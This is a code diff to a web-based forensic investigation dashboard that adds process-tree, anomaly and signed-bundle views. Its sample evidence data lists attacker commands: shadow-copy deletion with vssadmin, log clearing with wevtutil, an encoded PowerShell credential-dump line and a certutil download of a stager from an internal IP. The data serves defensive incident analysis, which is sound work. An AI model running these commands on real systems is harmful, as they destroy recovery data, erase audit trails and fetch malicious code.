@@ -867,6 +867,134 @@
       background: #283752;
       color: #fff;
     }
+
+    /* --- Process Lineage Attack Chain View --- */
+    .lineage-view-container {
+      display: none;
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px;
+      background: var(--bg-base);
+    }
+
+    .lineage-view-container.active-view {
+      display: block;
+    }
+
+    .tree-card {
+      background: #0f1522;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .tree-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 14px;
+      border-bottom: 1px solid #1a2333;
+      padding-bottom: 10px;
+    }
+
+    .tree-node-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 8px 0;
+      font-family: var(--font-mono);
+      font-size: 12px;
+    }
+
+    .tree-node-badge {
+      background: #172033;
+      border: 1px solid #2a3750;
+      padding: 4px 8px;
+      border-radius: 4px;
+      color: var(--text-white);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .tree-node-badge:hover {
+      border-color: var(--wasp-yellow);
+      background: #1f2a40;
+    }
+
+    .tree-node-badge.alert-node {
+      border-color: var(--accent-crimson);
+      background: rgba(239, 68, 68, 0.12);
+      color: #fca5a5;
+    }
+
+    .tree-node-badge.alert-node:hover {
+      box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
+    }
+
+    /* --- Anomaly Spotlight View --- */
+    .anomaly-view-container {
+      display: none;
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px;
+      background: var(--bg-base);
+    }
+
+    .anomaly-view-container.active-view {
+      display: block;
+    }
+
+    .anomaly-cards-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+      gap: 16px;
+    }
+
+    .anomaly-tile {
+      background: #0f1522;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 16px;
+      transition: all 0.2s;
+    }
+
+    .anomaly-tile.critical {
+      border-left: 4px solid var(--accent-crimson);
+    }
+
+    .anomaly-tile.high {
+      border-left: 4px solid var(--accent-amber);
+    }
+
+    .anomaly-tile.medium {
+      border-left: 4px solid var(--accent-blue);
+    }
+
+    /* --- Signed .wasp Vault View --- */
+    .bundle-view-container {
+      display: none;
+      flex: 1;
+      overflow-y: auto;
+      padding: 24px;
+      background: var(--bg-base);
+    }
+
+    .bundle-view-container.active-view {
+      display: block;
+    }
+
+    .bundle-vault-card {
+      background: #0f1522;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 24px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
   </style>
 </head>
 <body>
@@ -923,17 +1051,32 @@
 
       <div class="sidebar-nav">
         <div class="nav-section-title">Case Operations</div>
-        <div class="nav-item active" onclick="selectNav(this, 'all')">
+        <div class="nav-item active" id="nav-timeline" onclick="switchView('timeline')">
           <span class="nav-icon">⏱️</span>
           <span class="nav-text">Super-Timeline</span>
           <span class="nav-count" id="count-all">28</span>
         </div>
-        <div class="nav-item" onclick="selectNav(this, 'threat')">
+        <div class="nav-item" id="nav-lineage" onclick="switchView('lineage')">
+          <span class="nav-icon">🌲</span>
+          <span class="nav-text">Process Attack Tree</span>
+          <span class="nav-count" style="color: var(--wasp-yellow);" id="count-lineage">4 Chains</span>
+        </div>
+        <div class="nav-item" id="nav-anomaly" onclick="switchView('anomaly')">
+          <span class="nav-icon">⚡</span>
+          <span class="nav-text">Anomaly Spotlight</span>
+          <span class="nav-count" style="color: var(--accent-crimson);" id="count-anomalies">3 Bursts</span>
+        </div>
+        <div class="nav-item" id="nav-bundle" onclick="switchView('bundle')">
+          <span class="nav-icon">📦</span>
+          <span class="nav-text">Signed .wasp Vault</span>
+          <span class="nav-count" style="color: var(--accent-emerald);">SEALED</span>
+        </div>
+        <div class="nav-item" onclick="switchView('timeline'); applyFilter('ALERT', null)">
           <span class="nav-icon">🚨</span>
           <span class="nav-text">Threat & Anti-Forensics</span>
           <span class="nav-count" style="color: var(--accent-crimson);" id="count-threats">6</span>
         </div>
-        <div class="nav-item" onclick="selectNav(this, 'corroborated')">
+        <div class="nav-item" onclick="switchView('timeline'); applyFilter('CORROBORATED', null)">
           <span class="nav-icon">🔗</span>
           <span class="nav-text">Cross-Source Chains</span>
           <span class="nav-count" id="count-corrob">8</span>
@@ -990,62 +1133,175 @@
     <!-- CENTER WORKING CANVAS -->
     <main class="main-canvas">
 
-      <!-- Timeline Scrubber View -->
-      <section class="timeline-scrubber-pane">
-        <div class="scrubber-header">
-          <div class="scrubber-title">
-            <span>ACTIVITY DENSITY & BURST ANALYZER</span>
-            <span class="badge-alert">6 Anomalies Detected</span>
+      <!-- 1. Super-Timeline View -->
+      <div id="timeline-view" style="display: flex; flex-direction: column; flex: 1; height: 100%; overflow: hidden;">
+        <!-- Timeline Scrubber View -->
+        <section class="timeline-scrubber-pane">
+          <div class="scrubber-header">
+            <div class="scrubber-title">
+              <span>ACTIVITY DENSITY &amp; BURST ANALYZER</span>
+              <span class="badge-alert">6 Anomalies Detected</span>
+            </div>
+            <div class="scrubber-time-range">
+              <span>2024-03-10T14:30:00Z</span> &rarr; <span>2024-03-11T02:17:30Z</span>
+            </div>
           </div>
-          <div class="scrubber-time-range">
-            <span>2024-03-10T14:30:00Z</span> &rarr; <span>2024-03-11T02:17:30Z</span>
+
+          <div class="scrubber-chart-container" id="scrubber-bars">
+            <!-- Populated by JS -->
           </div>
+
+          <div class="chart-axis-labels">
+            <span>Mar 10 14:00</span>
+            <span>Mar 10 18:00</span>
+            <span>Mar 10 22:00</span>
+            <span>Mar 11 02:00 (Incident Peak)</span>
+            <span>Mar 11 06:00</span>
+          </div>
+        </section>
+
+        <!-- Filter Chips Toolbar -->
+        <div class="filter-toolbar">
+          <div class="filter-chip active" onclick="applyFilter('ALL', this)">All Events (28)</div>
+          <div class="filter-chip danger" onclick="applyFilter('ALERT', this)">🚨 Threat &amp; Timestomp (6)</div>
+          <div class="filter-chip" onclick="applyFilter('CORROBORATED', this)">🔗 Corroborated (8)</div>
+          <div class="filter-chip" onclick="applyFilter('PROCESS', this)">⚙️ Execution &amp; LOLBins (7)</div>
+          <div class="filter-chip" onclick="applyFilter('FILE', this)">📁 File MACB (8)</div>
+          <div class="filter-chip" onclick="applyFilter('BROWSER', this)">🌐 Browser C2 / Exfil (4)</div>
+          
+          <div class="filter-spacer"></div>
+          <div class="view-count-text" id="view-count">Displaying 28 events</div>
         </div>
 
-        <div class="scrubber-chart-container" id="scrubber-bars">
-          <!-- Populated by JS -->
+        <!-- High-Density Evidence Grid -->
+        <div class="grid-container">
+          <table class="evidence-table">
+            <thead>
+              <tr>
+                <th>Time (UTC)</th>
+                <th>Category</th>
+                <th>Artifact Source</th>
+                <th>Target Object / Command</th>
+                <th>User</th>
+                <th>Cryptographic Hash</th>
+                <th>Anomaly Flag</th>
+              </tr>
+            </thead>
+            <tbody id="evidence-tbody">
+              <!-- Populated by JavaScript -->
+            </tbody>
+          </table>
         </div>
-
-        <div class="chart-axis-labels">
-          <span>Mar 10 14:00</span>
-          <span>Mar 10 18:00</span>
-          <span>Mar 10 22:00</span>
-          <span>Mar 11 02:00 (Incident Peak)</span>
-          <span>Mar 11 06:00</span>
-        </div>
-      </section>
-
-      <!-- Filter Chips Toolbar -->
-      <div class="filter-toolbar">
-        <div class="filter-chip active" onclick="applyFilter('ALL', this)">All Events (28)</div>
-        <div class="filter-chip danger" onclick="applyFilter('ALERT', this)">🚨 Threat & Timestomp (6)</div>
-        <div class="filter-chip" onclick="applyFilter('CORROBORATED', this)">🔗 Corroborated (8)</div>
-        <div class="filter-chip" onclick="applyFilter('PROCESS', this)">⚙️ Execution & LOLBins (7)</div>
-        <div class="filter-chip" onclick="applyFilter('FILE', this)">📁 File MACB (8)</div>
-        <div class="filter-chip" onclick="applyFilter('BROWSER', this)">🌐 Browser C2 / Exfil (4)</div>
-        
-        <div class="filter-spacer"></div>
-        <div class="view-count-text" id="view-count">Displaying 28 events</div>
       </div>
 
-      <!-- High-Density Evidence Grid -->
-      <div class="grid-container">
-        <table class="evidence-table">
-          <thead>
-            <tr>
-              <th>Time (UTC)</th>
-              <th>Category</th>
-              <th>Artifact Source</th>
-              <th>Target Object / Command</th>
-              <th>User</th>
-              <th>Cryptographic Hash</th>
-              <th>Anomaly Flag</th>
-            </tr>
-          </thead>
-          <tbody id="evidence-tbody">
-            <!-- Populated by JavaScript -->
-          </tbody>
-        </table>
+      <!-- 2. Process Lineage Attack Chain View -->
+      <div id="lineage-view" class="lineage-view-container">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+          <div>
+            <h2 style="font-size: 16px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 8px;">
+              <span>🌲</span> Process Execution Lineage &amp; Attack Tree
+            </h2>
+            <p style="color: var(--text-muted); font-size: 12px; margin-top: 4px;">
+              Reconstructs Parent-Child (PPID &rarr; PID) execution chains from Windows Event ID 4688 and Sysmon logs to identify initial intrusion vectors and living-off-the-land executions.
+            </p>
+          </div>
+          <div class="stats-chip">
+            <span>Root Trees: <strong style="color: var(--wasp-yellow);">4</strong></span>
+            <span>|</span>
+            <span>Suspicious Spawns: <strong style="color: var(--accent-crimson);">3 Detected</strong></span>
+          </div>
+        </div>
+        <div id="lineage-trees-container">
+          <!-- Rendered by JS -->
+        </div>
+      </div>
+
+      <!-- 3. Anomaly Spotlight View -->
+      <div id="anomaly-view" class="anomaly-view-container">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+          <div>
+            <h2 style="font-size: 16px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 8px;">
+              <span>⚡</span> Statistical Anomaly Spotlight &amp; Burst Detector
+            </h2>
+            <p style="color: var(--text-muted); font-size: 12px; margin-top: 4px;">
+              Rolling Z-score baseline modeling flag activity bursts, off-hours administrative logons, and rapid mass file modification loops (ransomware signatures).
+            </p>
+          </div>
+          <div class="stats-chip">
+            <span>Z-Threshold: <strong>2.0 &sigma;</strong></span>
+            <span>|</span>
+            <span>Off-Hours Window: <strong>22:00 - 06:00 UTC</strong></span>
+          </div>
+        </div>
+        <div class="anomaly-cards-grid" id="anomaly-grid-container">
+          <!-- Rendered by JS -->
+        </div>
+      </div>
+
+      <!-- 4. Signed .wasp Case Bundle Vault -->
+      <div id="bundle-view" class="bundle-view-container">
+        <div class="bundle-vault-card">
+          <div style="display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border-color); padding-bottom: 16px; margin-bottom: 20px;">
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <div style="width: 42px; height: 42px; background: rgba(16, 185, 129, 0.15); border: 1px solid var(--accent-emerald); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px;">
+                🛡️
+              </div>
+              <div>
+                <h2 style="font-size: 16px; font-weight: 800; color: #fff;">Deterministic Signed Case Bundle (.wasp)</h2>
+                <p style="font-size: 12px; color: var(--accent-emerald); font-weight: 600;">Court-Admissible Single-File Sealed Archive</p>
+              </div>
+            </div>
+            <button class="btn-wasp" onclick="exportSignedBundle()">
+              <span>📥</span>
+              <span>Export .wasp Container</span>
+            </button>
+          </div>
+
+          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-bottom: 20px;">
+            <div style="background: #131926; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px;">
+              <div style="font-size: 11px; color: var(--text-dim); text-transform: uppercase; font-weight: 700;">Bundle Format</div>
+              <div style="font-size: 14px; font-weight: 800; color: var(--wasp-yellow); margin-top: 4px;">WASP_CONTAINER_V1</div>
+            </div>
+            <div style="background: #131926; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px;">
+              <div style="font-size: 11px; color: var(--text-dim); text-transform: uppercase; font-weight: 700;">Signing Algorithm</div>
+              <div style="font-size: 14px; font-weight: 800; color: var(--accent-cyan); margin-top: 4px;">HMAC-SHA256 (256-bit)</div>
+            </div>
+            <div style="background: #131926; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px;">
+              <div style="font-size: 11px; color: var(--text-dim); text-transform: uppercase; font-weight: 700;">Ledger Integrity</div>
+              <div style="font-size: 14px; font-weight: 800; color: var(--accent-emerald); margin-top: 4px;">100% Tamper-Evident</div>
+            </div>
+          </div>
+
+          <div class="detail-card" style="margin-bottom: 16px;">
+            <div class="detail-card-title">🔐 Cryptographic Attestation Proof</div>
+            <div class="kv-row">
+              <span class="kv-key">Active Merkle Root:</span>
+              <span class="kv-val" style="color: var(--wasp-yellow);">1c73170a4c28f92bd3a42ebcfb934757279c6d3283f518e244d21650b284e38c</span>
+            </div>
+            <div class="kv-row">
+              <span class="kv-key">Custody Chain Tip:</span>
+              <span class="kv-val" style="color: var(--accent-cyan);">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</span>
+            </div>
+            <div class="kv-row">
+              <span class="kv-key">RFC 3161 TSA Serial:</span>
+              <span class="kv-val">TSA-2026-CHRONO-89104821</span>
+            </div>
+            <div class="kv-row">
+              <span class="kv-key">Protected Evidence:</span>
+              <span class="kv-val" style="color: var(--accent-emerald);">Hardware Write-Guard Enforced (Read-Only)</span>
+            </div>
+          </div>
+
+          <div style="background: rgba(234, 179, 8, 0.08); border: 1px solid rgba(234, 179, 8, 0.3); border-radius: 8px; padding: 14px; display: flex; align-items: center; justify-content: space-between;">
+            <div>
+              <strong style="color: var(--wasp-yellow); font-size: 13px;">Verify Any External .wasp Bundle</strong>
+              <p style="color: var(--text-muted); font-size: 11px; margin-top: 2px;">Inspect external cases, independently recompute Merkle root, and validate court integrity.</p>
+            </div>
+            <button class="btn-secondary" onclick="alert('Run CLI: wasp bundle verify [case_bundle.wasp] --passphrase [KEY]')">
+              Run Verifier CLI
+            </button>
+          </div>
+        </div>
       </div>
     </main>
 
@@ -1523,10 +1779,217 @@
       alert("✅ WASP Forensic Case Package Successfully Exported!\nIncludes Court-Ready Executive Summary, Merkle Tree Attestation, RFC 3161 Tokens, and Chronological Super-Timeline.");
     }
 
+    // Sample Lineage and Anomaly datasets
+    const LINEAGE_DATA = [
+      {
+        pid: "4401",
+        name: "explorer.exe",
+        user: "admin",
+        cmd: "C:\\Windows\\explorer.exe",
+        time: "2024-03-11 02:14:07 UTC",
+        alerts: [],
+        children: [
+          {
+            pid: "5120",
+            name: "cmd.exe",
+            user: "admin",
+            cmd: "cmd.exe /c powershell.exe -enc c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz",
+            time: "2024-03-11 02:16:15 UTC",
+            alerts: ["SUSPICIOUS_SPAWN: Interactive user spawning command interpreter"],
+            children: [
+              {
+                pid: "5892",
+                name: "powershell.exe",
+                user: "admin",
+                cmd: "powershell.exe -enc c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz",
+                time: "2024-03-11 02:16:45 UTC",
+                alerts: ["T1003 MIMIKATZ: Encoded credential dump payload"],
+                children: [
+                  {
+                    pid: "6012",
+                    name: "vssadmin.exe",
+                    user: "admin",
+                    cmd: "vssadmin.exe delete shadows /all /quiet",
+                    time: "2024-03-11 02:17:00 UTC",
+                    alerts: ["T1490 RANSOMWARE: Deletion of Volume Shadow Copies"],
+                    children: []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        pid: "3210",
+        name: "winword.exe",
+        user: "victim_user",
+        cmd: "\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" invoice_malicious.docm",
+        time: "2024-03-10 14:35:10 UTC",
+        alerts: [],
+        children: [
+          {
+            pid: "3920",
+            name: "cmd.exe",
+            user: "victim_user",
+            cmd: "cmd.exe /c certutil -urlcache -split -f http://192.168.1.200/stager.exe C:\\temp\\stager.exe",
+            time: "2024-03-10 14:35:14 UTC",
+            alerts: ["CRITICAL: Office macro spawning command interpreter & LOLBin certutil download"],
+            children: []
+          }
+        ]
+      }
+    ];
+
+    const ANOMALY_DATA = [
+      {
+        id: "ANOM-001",
+        title: "Off-Hours Privileged Administrative Logon",
+        type: "OFF_HOURS_LOGON",
+        severity: "HIGH",
+        z_score: "3.4 σ",
+        window: "2024-03-11 02:14:07 UTC",
+        users: ["admin"],
+        description: "User 'admin' authenticated via SSH during unusual early-morning operational window (02:14 AM UTC). Target: sshd session from external IP 192.168.1.100."
+      },
+      {
+        id: "ANOM-002",
+        title: "Activity Volume Burst Spike (Peak Incident Window)",
+        type: "BURST_ACTIVITY",
+        severity: "CRITICAL",
+        z_score: "4.8 σ",
+        window: "2024-03-11 02:15:00 - 02:17:30 UTC",
+        users: ["admin", "SYSTEM"],
+        description: "Statistical burst anomaly detected (14 critical events in < 2.5 minutes). Volume exceeded baseline by 4.8 standard deviations. Encompasses shadow copy deletion, encoded PowerShell, and log wiping."
+      },
+      {
+        id: "ANOM-003",
+        title: "Anti-Forensics Event Log Cleared",
+        type: "ANTI_FORENSICS_WIPE",
+        severity: "CRITICAL",
+        z_score: "5.1 σ",
+        window: "2024-03-11 02:17:10 UTC",
+        users: ["admin"],
+        description: "Event ID 1102 generated: Windows Security audit log intentionally wiped using 'wevtutil cl Security'. Precedes USB storage connection."
+      }
+    ];
+
+    // Main View Switching
+    function switchView(viewName) {
+      document.getElementById('timeline-view').style.display = (viewName === 'timeline') ? 'flex' : 'none';
+      
+      const lineageEl = document.getElementById('lineage-view');
+      const anomalyEl = document.getElementById('anomaly-view');
+      const bundleEl = document.getElementById('bundle-view');
+
+      if (viewName === 'lineage') lineageEl.classList.add('active-view');
+      else lineageEl.classList.remove('active-view');
+
+      if (viewName === 'anomaly') anomalyEl.classList.add('active-view');
+      else anomalyEl.classList.remove('active-view');
+
+      if (viewName === 'bundle') bundleEl.classList.add('active-view');
+      else bundleEl.classList.remove('active-view');
+
+      // Update sidebar active highlights
+      document.querySelectorAll('.sidebar-nav .nav-item').forEach(i => i.classList.remove('active'));
+      const activeNav = document.getElementById('nav-' + viewName);
+      if (activeNav) activeNav.classList.add('active');
+    }
+
+    function renderLineage() {
+      const container = document.getElementById('lineage-trees-container');
+      if (!container) return;
+      container.innerHTML = '';
+
+      LINEAGE_DATA.forEach(tree => {
+        const card = document.createElement('div');
+        card.className = 'tree-card';
+
+        let html = `
+          <div class="tree-header">
+            <div>
+              <span style="color: var(--wasp-yellow); font-weight: 800; font-size: 13px;">ROOT PROCESS:</span>
+              <strong style="color: #fff; margin-left: 6px;">${tree.name} (PID: ${tree.pid})</strong>
+              <span style="color: var(--text-dim); margin-left: 8px;">User: ${tree.user}</span>
+            </div>
+            <span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-dim);">${tree.time}</span>
+          </div>
+          <div style="font-family: var(--font-mono); font-size: 11px; color: var(--accent-cyan); margin-bottom: 12px; background: #0a0d14; padding: 6px 10px; border-radius: 4px;">
+            ${tree.cmd}
+          </div>
+        `;
+
+        function renderSubNodes(children, indent = 20) {
+          children.forEach(child => {
+            const hasAlert = child.alerts && child.alerts.length > 0;
+            const alertHtml = hasAlert ? child.alerts.map(a => `<span class="badge-alert" style="margin-left: 8px;">🚨 ${a}</span>`).join('') : '';
+            html += `
+              <div class="tree-node-row" style="padding-left: ${indent}px;">
+                <span style="color: var(--text-dim);">└──</span>
+                <div class="tree-node-badge ${hasAlert ? 'alert-node' : ''}" onclick="selectEvidence({
+                  id: 'PROC-${child.pid}',
+                  path: '${child.cmd.replace(/'/g, "\\'")}',
+                  plugin: 'EVTX (4688 Lineage)',
+                  category: 'PROCESS_START',
+                  user: '${child.user}',
+                  hash: '15957efb2f1573f54546ae80808b0870',
+                  hex: 'PID: ${child.pid} | Executable: ${child.name}',
+                  time: '${child.time.replace(' UTC', '')}'
+                })">
+                  <strong>${child.name}</strong>
+                  <span style="color: var(--text-dim); font-size: 11px;">(PID: ${child.pid})</span>
+                  <span style="color: #64748b;">[${child.user}]</span>
+                  ${alertHtml}
+                </div>
+              </div>
+            `;
+            if (child.children && child.children.length > 0) {
+              renderSubNodes(child.children, indent + 28);
+            }
+          });
+        }
+
+        renderSubNodes(tree.children);
+        card.innerHTML = html;
+        container.appendChild(card);
+      });
+    }
+
+    function renderAnomalies() {
+      const container = document.getElementById('anomaly-grid-container');
+      if (!container) return;
+      container.innerHTML = '';
+
+      ANOMALY_DATA.forEach(a => {
+        const tile = document.createElement('div');
+        tile.className = `anomaly-tile ${a.severity.toLowerCase()}`;
+        tile.innerHTML = `
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+            <span class="badge-alert" style="background: ${a.severity === 'CRITICAL' ? 'rgba(239,68,68,0.2)' : 'rgba(245,158,11,0.2)'}; color: ${a.severity === 'CRITICAL' ? 'var(--accent-crimson)' : 'var(--accent-amber)'};">${a.severity}</span>
+            <span style="font-family: var(--font-mono); font-size: 12px; font-weight: 700; color: var(--wasp-yellow);">Z-Score: ${a.z_score}</span>
+          </div>
+          <h3 style="color: #fff; font-size: 13px; font-weight: 700; margin-bottom: 6px;">${a.title}</h3>
+          <p style="color: var(--text-muted); font-size: 11.5px; line-height: 1.5; margin-bottom: 12px;">${a.description}</p>
+          <div style="font-family: var(--font-mono); font-size: 10.5px; color: var(--text-dim); border-top: 1px solid #1a2333; padding-top: 8px;">
+            <div>Time: <span style="color: var(--text-main);">${a.window}</span></div>
+            <div>Affected: <span style="color: var(--accent-cyan);">${a.users.join(', ')}</span></div>
+          </div>
+        `;
+        container.appendChild(tile);
+      });
+    }
+
+    function exportSignedBundle() {
+      alert("📦 Deterministic Signed Case Bundle (.wasp) Generated!\n\nMerkle Root: 1c73170a4c28f92bd3a42ebcfb934757279c6d3283f518e244d21650b284e38c\nSignature: HMAC-SHA256 (Sealed)\nSaved to case/CASE-2026-0881.wasp");
+    }
+
     // Initialize on load
     window.onload = () => {
       initScrubber();
       renderTable();
+      renderLineage();
+      renderAnomalies();
     };
   </script>
 </body>
